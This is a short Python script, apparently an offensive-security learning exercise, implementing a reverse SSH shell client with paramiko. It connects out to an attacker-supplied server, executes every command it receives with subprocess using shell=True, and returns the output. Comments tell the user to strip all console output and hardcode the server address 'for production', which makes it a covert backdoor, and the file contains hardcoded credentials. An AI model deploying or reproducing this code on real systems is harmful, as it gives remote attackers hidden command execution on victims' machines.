'''
Similar to ssh_cmd.py, except now multiple commands are taken from the server, 
executed, and the output is returned to the caller.
'''

'''
This is technically the client program; however, along with ssh_server.py this 'client' receives and executes commands
'''

'''
FOR PRODUCTION MODIFY AS FOLLOWS:
        - remove all prompts and console output
        - hardcode the server address and port
'''

import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)       # Sending the first command before entering the loop, which is 'ClientConnected'
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == '__main__':
    import getpass
    user = 'FROZENTERRESTRIAL'	# input('Enter username: ')    # getpass.getuser()
    password = 'FROZEN'	# getpass.getpass()

    ip = input('Enter server IP: ')
    port = input('Enter port: ')
    ssh_command(ip, port, user, password, 'ClientConnected')
